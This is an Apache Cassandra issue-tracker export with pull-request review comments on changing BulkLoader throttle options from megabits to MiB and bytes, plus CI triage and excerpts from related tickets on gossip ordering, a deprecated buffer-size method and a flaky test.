@@ -85,10 +101,10 @@
     public final String user;
     public final String passwd;
     public final AuthProvider authProvider;
-    public final int throttle;
-    public final int interDcThrottle;
-    public final int entireSSTableThrottle;
-    public final int entireSSTableInterDcThrottle;
+    public final double throttleMegabits;
+    public final double interDcThrottleMegabits;

Review Comment:
   I feel less worried about someone reading the field values... I can only image the use cases that use the option name constants to invoke the tool, or construct the option programmatically. The change does not affect those use cases. 



;08/Jul/22 22:18;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r922494130


##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).intValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).intValue());

Review Comment:
   Considering you kept throttleMegabits and interDcThrottleMegabits being double, I guess this comment is outdated. 
   I spent some time thinking and I think we should just make internally those 4 properties to be operated in bytes and change also throttleMegabits and interDcThrottleMegabits to being bytes. This will save a lot of calculations and headache. 
   If we step back and look at the StreaManager.StreamRateLimiter, we will see that the rate limiter expects bytes.
   Why this was actually not done when we were switching to the new types - because the whole effort was huge and switching internally parameters to smallest possible unit was left for follow up improvement tickets. But in this case I think this is at this point more like a bug considering how many twists and calculations the bulk loader will trigger. WDYT? CC @yifan-c 



;15/Jul/22 20:25;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r922494130


##########
src/java/org/apache/cassandra/tools/BulkLoader.java:
##########
@@ -67,9 +73,11 @@ public static void load(LoaderOptions options) throws BulkLoadException
                         handler,
                         options.connectionsPerHost,
                         options.targetKeyspace);
-        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(options.throttle);
-        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(options.interDcThrottle);
-        StreamResultFuture future = null;
+        DatabaseDescriptor.setStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.throttleMegabits).intValue());
+        DatabaseDescriptor.setInterDCStreamThroughputOutboundMegabitsPerSec(Double.valueOf(options.interDcThrottleMegabits).intValue());

Review Comment:
   Considering you kept `throttleMegabits` and `interDcThrottleMegabits` being double, I guess this comment is outdated. 
   I spent some time thinking and I think we should just make internally those 4 properties to be operated in bytes and change also `throttleMegabits` and `interDcThrottleMegabits` to being bytes. This will save a lot of calculations and headache. 
   If we step back and look at the `StreaManager.StreamRateLimiter`, we will see that the rate limiter expects bytes.
   Why this was actually not done when we were switching to the new types - because the whole effort was huge and switching internally parameters to smallest possible unit was left for follow up improvement tickets. But in this case I think this is at this point more like a bug considering how many twists and calculations the bulk loader will trigger. Also, division is more expensive operation so it is good if we can get rid of it. WDYT? CC @yifan-c 



;15/Jul/22 20:26;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r946080778


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -669,10 +755,12 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001), this option is deprecated, all communication goes through storage port which handles encrypted communication as well"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbps (default 0 for unlimited), this option is deprecated, use \""throttle-mib\"" instead"");

Review Comment:
   nit: use `tmib`, while `throttle-mib` explains it all, the actual option is different



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -669,10 +755,12 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001), this option is deprecated, all communication goes through storage port which handles encrypted communication as well"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbps (default 0 for unlimited), this option is deprecated, use \""throttle-mib\"" instead"");

Review Comment:
   Same for the `inter-dc`



;15/Aug/22 20:11;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r946203486


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -669,10 +755,12 @@ private static CmdLineOptions getCmdLineOptions()
         options.addOption(""p"",  NATIVE_PORT_OPTION, ""native transport port"", ""port used for native connection (default 9042)"");
         options.addOption(""sp"",  STORAGE_PORT_OPTION, ""storage port"", ""port used for internode communication (default 7000)"");
         options.addOption(""ssp"",  SSL_STORAGE_PORT_OPTION, ""ssl storage port"", ""port used for TLS internode communication (default 7001), this option is deprecated, all communication goes through storage port which handles encrypted communication as well"");
-        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbits (default unlimited)"");
-        options.addOption(""idct"", INTER_DC_THROTTLE_MBITS, ""inter-dc-throttle"", ""inter-datacenter throttle speed in Mbits (default unlimited)"");
-        options.addOption(""e"", ENTIRE_SSTABLE_THROTTLE_MBITS, ""entire-sstable-throttle"", ""entire SSTable throttle speed in Mbits (default unlimited)"");
-        options.addOption(""eidct"", ENTIRE_SSTABLE_INTER_DC_THROTTLE_MBITS, ""entire-sstable-inter-dc-throttle"", ""entire SSTable inter-datacenter throttle speed in Mbits (default unlimited)"");
+        options.addOption(""t"", THROTTLE_MBITS, ""throttle"", ""throttle speed in Mbps (default 0 for unlimited), this option is deprecated, use \""throttle-mib\"" instead"");

Review Comment:
   We discussed offline and decided to keep the _long name_, and additionally, we decided to remove the short names that we're going to be introduced in this PR. I have updated the code, documentation, and tests to reflect the removal of the short names



;15/Aug/22 22:56;githubbot;600","yifan-c commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r948271746


##########
doc/modules/cassandra/pages/operating/bulk_loading.adoc:
##########
@@ -80,13 +80,23 @@ The following options are supported, with `-d,--nodes <initial hosts>` required:
 -d,--nodes <initial hosts>                                   Required.
                                                              Try to connect to these hosts (comma separated) initially for ring information
 
+--entire-sstable-throttle-mib <throttle-mib>                 Entire SSTable throttle
+                                                             speed in MiB/s (default 0 for unlimited).
+
+--entire-sstable-inter-dc-throttle-mib                       <inter-dc-throttle-mib>
+                                                             Entire SSTable inter-datacenter throttle
+                                                             speed in MiB/s (default 0 for unlimited).
+
 -f,--conf-path <path to config file>                         cassandra.yaml file path for streaming throughput and client/server SSL.
 
 -h,--help                                                    Display this help message
 
 -i,--ignore <NODES>                                          Don't stream to this (comma separated) list of nodes
 
--idct,--inter-dc-throttle <inter-dc-throttle>                Inter-datacenter throttle speed in Mbits (default unlimited)
+-idct,--inter-dc-throttle <inter-dc-throttle>                (deprecated) Inter-datacenter throttle speed in Mbits (default 0 for unlimited)
+                                                             Use -idctmib / --inter-dc-throttle-mib instead

Review Comment:
   remove `-idctmib`



##########
doc/modules/cassandra/pages/operating/bulk_loading.adoc:
##########
@@ -111,8 +121,10 @@ The following options are supported, with `-d,--nodes <initial hosts>` required:
                                                              for TLS internode communication (default 7001)
 -st,--store-type <STORE-TYPE>                                Client SSL:
                                                              type of store
--t,--throttle <throttle>                                     Throttle
-                                                             speed in Mbits (default unlimited)
+-t,--throttle <throttle>                                     (deprecated) Throttle speed in Mbits (default 0 for unlimited)
+                                                             Use -tmib / --throttle-mib instead

Review Comment:
   remove `-tmib`



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -224,27 +238,27 @@ public Builder authProvider(AuthProvider authProvider)
             return this;
         }
 
-        public Builder throttle(int throttle)
+        public Builder throttleMegabits(int throttleMegabits)

Review Comment:
   I am kind of worried about the similarity of the names... It could be prone to oversights. 
   For example, code auto-completion may put `throttleMegabits`, while the actual intent is to have `throttleMebibytes`. 
   How about not introducing a new method with the similar name, but adding java docs to indicate the input `throttle` (better rename it to `throttleMegabits`) is in the megabits, and the method is deprecated. 
   @ekaterinadimitrova2 , what do you think?



##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -22,25 +22,37 @@
 
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationTargetException;
-import java.net.*;
+import java.net.InetAddress;

Review Comment:
   I am not against the changes. Those are good and more in line with the code style, but unrelated changes of the patch. 



;17/Aug/22 18:32;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r948394660


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -224,27 +238,27 @@ public Builder authProvider(AuthProvider authProvider)
             return this;
         }
 
-        public Builder throttle(int throttle)
+        public Builder throttleMegabits(int throttleMegabits)

Review Comment:
   Oh so you suggest we remove the throttleMegabits and end up only with the old deprecated throttle and the new throttleMebibytes
   That also should work. Honestly, people again can make the same mistake and ignore throttle was in megabits but I guess less methods is better. Also, if we decide to get rid of the megabits version for those properties on a major version.
   
   better rename it to throttleMegabits --> I think any renaming here will be breaking change?



;17/Aug/22 20:40;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r948394660


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -224,27 +238,27 @@ public Builder authProvider(AuthProvider authProvider)
             return this;
         }
 
-        public Builder throttle(int throttle)
+        public Builder throttleMegabits(int throttleMegabits)

Review Comment:
   Oh so you suggest we remove the `throttleMegabits` and end up only with the old deprecated `throttle` and the new `throttleMebibytes`
   That also should work. Honestly, people again can make the same mistake and ignore `throttle `was in megabits but I guess less methods is better. Also, if we decide to get rid of the megabits version for those properties on a major version.
   
   better rename it to throttleMegabits --> I think any renaming here will be breaking change?



;17/Aug/22 20:41;githubbot;600","ekaterinadimitrova2 commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r948394660


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -224,27 +238,27 @@ public Builder authProvider(AuthProvider authProvider)
             return this;
         }
 
-        public Builder throttle(int throttle)
+        public Builder throttleMegabits(int throttleMegabits)

Review Comment:
   Oh so you suggest we remove the `throttleMegabits` and end up only with the old deprecated `throttle` and the new `throttleMebibytes`
   That also should work. Honestly, people again can make the same mistake and ignore `throttle `was in megabits but I guess less methods is better. Also, if we decide to get rid of the megabits version for those properties on a major version.
   
   `better rename it to throttleMegabits` --> I think any renaming here will be breaking change?



;17/Aug/22 20:41;githubbot;600","yifan-c commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r948472594


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -224,27 +238,27 @@ public Builder authProvider(AuthProvider authProvider)
             return this;
         }
 
-        public Builder throttle(int throttle)
+        public Builder throttleMegabits(int throttleMegabits)

Review Comment:
   > better rename it to throttleMegabits
   
   I was not clear on what is ""it"". I mean to say that it is better to just rename the _input parameter_ from `throttle` to `throttleMegabits`. Instead, we have 
   
   ```java
           @Deprecated 
           public Builder throttle(int throttleMegabits)
           {
              ...
           }
   ```



;17/Aug/22 22:05;githubbot;600","frankgh commented on code in PR #1701:
URL: https://github.com/apache/cassandra/pull/1701#discussion_r949377056


##########
src/java/org/apache/cassandra/tools/LoaderOptions.java:
##########
@@ -22,25 +22,37 @@
 
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationTargetException;
-import java.net.*;
+import java.net.InetAddress;

Review Comment:
   should I revert these changes?



;18/Aug/22 16:44;githubbot;600","smiklosovic closed pull request #1701: CASSANDRA-17677: Fix BulkLoader to load entireSSTableThrottle and entireSSTableInterDcThrottle
URL: https://github.com/apache/cassandra/pull/1701


;22/Oct/22 11:31;githubbot;600","smiklosovic closed pull request #1658: CASSANDRA-17677: Fix BulkLoader to load entireSSTableThrottle and entireSSTableInterDcThrottle
URL: https://github.com/apache/cassandra/pull/1658


;30/Jan/23 10:57;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,0,34800,,,0,34800,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17065,,,,,,,,,,CASSANDRA-17817,CASSANDRA-17843,,,,,,,,,0.0,frankgh,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Aug 19 21:56:47 UTC 2022,,,,,,,All,,,,"0|z12vog:",9223372036854775807,,,,e.dimitrova,ycai,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/83c169ec9e36324f27bf562951362f4a03c3c688,,,,,,,,,PR available here: https://github.com/apache/cassandra/pull/1658,,,,,"02/Jun/22 20:31;e.dimitrova;I feel we lack testing of config for the BulkLoader.

The LoaderOptions test is there indeed, but while BulkLoaderTest exists, it doesn't exhaust all the config and this seems risky to me.

I just also noticed CASSANDRA-17062 which is  another config load problem in the same area.

There was huge effort to test required config parameters of tools in 4.0.

I think it is time to add additional testing for other config too. 

[~dcapwell], what do you think? I know you were actually reviewing those testing efforts so you probably have a point of view. Also, we need second committer reviewer, if you have time. :)  

 

About the currently published patch - I did a quick skim and things look good to me so far. The only thing I miss is BulkLoader test that the config is loaded properly as LoaderOptionsTest checks only the parsing as we already noticed. We also need full CI run. ;;;","03/Jun/22 13:54;e.dimitrova;I just noticed we have duplication around the docs, sstableloader.

There is a dedicated page sstableloader.adoc that also needs to be updated - the parameters are listed there too.

I can also open a separate follow up doc ticket to consolidate those so we do not duplicate things. ;;;","06/Jun/22 17:22;frankgh;[~e.dimitrova] thanks for taking a look at the PR. CI run is here: [https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17677&filter=all]. There seems to be some [utests_system_keyspace_directory1597|https://app.circleci.com/pipelines/github/frankgh/cassandra/76/workflows/baf37eb4-aee5-400b-b08f-20f7972088ab/jobs/1597] unrelated failing tests.

I will go ahead and add the missing tests and add the documentation to sstableloader.adoc ;;;","07/Jun/22 07:12;e.dimitrova;{quote}bq There seems to be some [utests_system_keyspace_directory1597|https://app.circleci.com/pipelines/github/frankgh/cassandra/76/workflows/baf37eb4-aee5-400b-b08f-20f7972088ab/jobs/1597] unrelated failing tests.
{quote}
I can confirm that those are known failures - CASSANDRA-17489
 ;;;","07/Jun/22 18:27;e.dimitrova;Marking as needs committer as David won’t have the chance to take a look at this one in the next two weeks. ;;;","14/Jun/22 21:47;yifanc;Left comments in the PR.;;;","20/Jun/22 17:28;e.dimitrova;Me too, I agree with [~yifanc]'s suggestions. ;;;","22/Jun/22 19:38;frankgh;trunk: [https://github.com/apache/cassandra/pull/1658]

4.1: [https://github.com/apache/cassandra/pull/1701]

Circle CI: https://app.circleci.com/pipelines/github/frankgh/cassandra?filter=all;;;","22/Jun/22 21:29;yifanc;+1 on the patch. ;;;","23/Jun/22 00:37;e.dimitrova;Hey[~frankgh], Thanks, I will take a look tomorrow morning but in the meantime I noticed you have CI run only for 4.1, can we run the tests also for the trunk branch, please? Thanks!;;;","23/Jun/22 00:53;frankgh;[~e.dimitrova] 4.1 is run 84 and trunk is run 82. Not sure how to link them directly but you should be able to see both runs in the link above.;;;","23/Jun/22 18:39;e.dimitrova;Thanks [~frankgh] !

Normally we open the exact workflow where we see the details and link that one. But providing the run numbers also works. Thanks!

Overall looks great and I like how you improved the testing! I found only one precision issue and a few nits, more details in the PR;;;","24/Jun/22 18:34;frankgh;Updated PR with comments

trunk CI: [https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17677&filter=all]

4.1 CI: https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17677-4.1&filter=all;;;","30/Jun/22 19:13;e.dimitrova;Thank you for bearing with me to address all my review comments [~frankgh] , overall I am +1. We need only NEWS.txt entry to mention the deprecated flags&methods and mention the new ones and I have one comment that I will leave to [~yifanc] for final preference. :) More on the PR

I will be off tomorrow and Monday but if you finish, squash and rebase, CI doesn't show anything new and [~yifanc] is fine with the patch, feel free to commit it. Thanks!;;;","02/Aug/22 13:47;e.dimitrova;For the record, we had an off-line discussion that the best approach would be to have the streaming parameters internally handled in bytes. The RateLimiter accepts them in bytes anyway and this reduces the calculations for the tools like Nodetool and BulkLoader. That change was done in another ticket so I think now we can rebase this one and take advantage of the change. It will help us with precision problems as we don't need anymore to switch between the old megabits/s unit and MiB/s. Switching from MiB/s and megabits/s to bytes is neat. ;;;","15/Aug/22 16:07;frankgh;I went ahead and implemented the suggestion of handling the parameters internally in bytes. This approach allows us to have no conversion issues. Pipelines look happy for {{4.1}} but there are 15 errors here https://app.circleci.com/pipelines/github/frankgh/cassandra/110/workflows/07658b64-caea-41dc-93d2-214de0ff7f2b/jobs/2453. They seem to be coming from the {{test_collection_function}} tests. These failing tests look unrelated to this PR.;;;","15/Aug/22 16:21;e.dimitrova;Thanks [~frankgh] , I just actually pulled your latest code and will be looking into it today.

About CI - I can confirm the failure in 4.1 is already seen in butler and unrelated, there is no ticket though -  [https://ci-cassandra.apache.org/job/Cassandra-4.1/131/testReport/dtest-offheap.hintedhandoff_test/TestHintedHandoff/test_hintedhandoff_window/] We probably need to follow up on it where it came from as it seems new... But it is out of scope here. 

You are right about the test_collection_function tests, seems they just started failing consistently last week. I will follow up on that as the patch after which they started failing shouldn't have broken them in theory but who knows... https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-trunk/trunk

I will post my review/approval later today. 

 ;;;","15/Aug/22 20:19;e.dimitrova;In my humble opinion this looks really good! Docs, tests, etc..

-I left only one comment about a description, otherwise- I am +1. We need only CHANGES.txt and NEWS.txt (deprecation section and to explain we have changed the new flags for entire-stable as this is not compatible with alpha1 version)

I think we are only looking for [~yifanc] final comment (I guess he wants to make final check after the discussions and the latest changes?)

Last but not least, as far as I can tell the patch is the same for 4.1 and trunk so I reviewed only the 4.1 PR. Please let me know if that was not the case and there is something in addition I need to look at.;;;","15/Aug/22 22:18;e.dimitrova;I figured out what happened with test_collection_function and opened a ticket CASSANDRA-17817;;;","19/Aug/22 17:35;yifanc;Starting commit

CI Results:
||Branch||Source||Circle CI||
|cassandra-4.1|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17677-cassandra-4.1-49D558C4-750C-4AE9-81D0-C89424123139]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17677-cassandra-4.1-49D558C4-750C-4AE9-81D0-C89424123139]|
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17677-trunk-49D558C4-750C-4AE9-81D0-C89424123139]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17677-trunk-49D558C4-750C-4AE9-81D0-C89424123139]|

Test result looks green. There is one test failure, IncRepairCoordinatorErrorTest#errorTest. It fails on my locally when switching to trunk/HEAD. So I believe it is not related with the patch. ;;;","19/Aug/22 21:27;yifanc;Committed into cassandra 4.1 as [83c169ec9|https://github.com/apache/cassandra/commit/83c169ec9e36324f27bf562951362f4a03c3c688] and merged up to trunk.;;;","19/Aug/22 21:35;e.dimitrova;Thanks [~yifanc], seems like this is a new test just freshly added in CASSANDRA-17834. I will ping [~jmckenzie] 

 ;;;","19/Aug/22 21:42;e.dimitrova;I just opened a ticket  CASSANDRA-17843 for the new test failure;;;","19/Aug/22 21:44;e.dimitrova;Oh there is also testConnectionsAreRejectedWithInvalidConfig failing on trunk but there is already a ticket for that one - CASSANDRA-17618;;;","19/Aug/22 21:56;yifanc;Thank you for filing the ticket!  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
When a node is bootstrapping it gets the whole gossip state but applies in random order causing some cases where StorageService will fail causing an instance to not show up in TokenMetadata,CASSANDRA-17676,13447807,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,31/May/22 23:21,28/Feb/23 21:05,13/Jul/23 08:40,01/Jun/22 17:51,5.0,,,,,,Cluster/Gossip,,,,0,,"When gossip state has a causal relationship, the order the state gets applied needs to match this relationship, and when it doesn’t it can cause bootstrap (which apply the whole state in an empty state) to see missing data or instances",,bdeggleston,brandon.williams,dcapwell,,,,,,,,,,,,"smiklosovic closed pull request #1656: CASSANDRA-17676: When a node is bootstrapping it gets the whole gossip state but applies in random order causing some cases where StorageService will fail causing an instance to not show up in TokenMetadata
URL: https://github.com/apache/cassandra/pull/1656


;17/Jun/22 07:30;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18292,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 01 15:58:09 UTC 2022,,,,,,,All,,,,"0|z12ukw:",9223372036854775807,,,,bdeggleston,,,,Normal,,2.0.0,,https://github.com/apache/cassandra/commit/2dcf7d221672ce5ca15dbeb666a8fedb7ec805ff,,,,,,,,,manual testing,,,,,"31/May/22 23:49;bdeggleston;+1;;;","01/Jun/22 15:58;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17676-trunk-81E3A7B3-80E0-40AD-914A-4A9BEFA7077F]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17676-trunk-81E3A7B3-80E0-40AD-914A-4A9BEFA7077F]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1746/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revert the removal and deprecate withBufferSizeInMB(int size) in favor of the new withBufferSizeInMiB(int size),CASSANDRA-17675,13447799,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,31/May/22 21:30,05/Oct/22 22:22,13/Jul/23 08:40,02/Jun/22 22:25,4.1,4.1-beta1,,,,,Tool/sstable,,,,0,,"_withBufferSizeInMB(int size)_ was renamed in 4.1. 

The right way to do it was to deprecate it and add the new one _withBufferSizeInMiB(int size)_

Add back _withBufferSizeInMB(int size)_ ",,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Degradation,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jun 02 22:23:51 UTC 2022,,,,,,,All,,,,"0|z12uj4:",9223372036854775807,,,,mck,,,,Normal,,4.1-alpha,,https://github.com/apache/cassandra/commit/2eac2590bfe85b76c5fc1ea7c818082e124f5ed5,,,,,,,,,Current tests were rerun,,,,,"31/May/22 21:38;e.dimitrova;[4.1&trunk patch PR|https://github.com/ekaterinadimitrova2/cassandra/pull/202] | [4.1 CI |https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=deprecate-old-names&filter=all] | [trunk CI|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=deprecate-trunk&filter=all]

Further to the fix I also updated the docs.

CI has only known failures where ticket exists.

[~maedhroz], [~dcapwell], [~mck], anyone of you up for a review?    ;;;","02/Jun/22 18:52;mck;+1;;;","02/Jun/22 19:59;e.dimitrova;Thanks [~mck] 

Rebased; updated also CHANGES.txt and NEWS.txt - see this commit - [https://github.com/ekaterinadimitrova2/cassandra/commit/2eac2590bfe85b76c5fc1ea7c818082e124f5ed5]

Running last CI:

[4.1|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1686/workflows/0fd9eb9f-3074-4b21-8ba2-d8c8b83613b8]

[trunk|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17675-trunk&filter=all];;;","02/Jun/22 22:23;e.dimitrova;I have good news and bad news. There are no new failures, but there is one that is not in Butler, no ticket but I can reproduce it in 4.1 so I will have to add one more flaky test ticket :( 

Committed 4.1 and trunk:

   663e51d928..2eac2590bf  cassandra-4.1 -> cassandra-4.1

   063a37699c..ce4ae43a31  trunk -> trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flaky CompactStorageTest,CASSANDRA-17670,13447485,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,30/May/22 09:28,07/Mar/23 10:38,13/Jul/23 08:40,07/Jun/22 07:29,4.1.x,5.0,,,,,Test/unit,,,,0,,"CompactStorageTest has been showing flaky behavior mainly due to timeouts such as [here|https://ci-cassandra.apache.org/job/Cassandra-4.1/43/testReport/org.apache.cassandra.cql3.validation.operations/CompactStorageTest/testAlterWithCompactNonStaticFormat/]",,adelapena,bereng,,,,,,,,,,,,,"smiklosovic closed pull request #1659: CASSANDRA-17670 Flaky CompactStorageTest
URL: https://github.com/apache/cassandra/pull/1659


;17/Jun/22 07:29;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 06 09:49:53 UTC 2022,,,,,,,All,,,,"0|z12slk:",9223372036854775807,,,,adelapena,,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/3dc30eb45ef52368520102f471d53061676e72cc,,,,,,,,,See PR,,,,,"31/May/22 08:46;bereng;The problem imo seems to be the test class was just growing past the timeout. With 5K lines and 90 test cases it was already taking a long time to run. So on a heavily loaded test env it makes sense it would time out occasionally. As in other similar cases before I have gone for a split which halfs the time. I hope it makes sense.

If we're happy with this approach I do trunk as well.

CC/[~adelapena] as we've done this before many times and it could be a quick review for you.;;;","31/May/22 12:15;adelapena;[~bereng] sure, I can take a look.

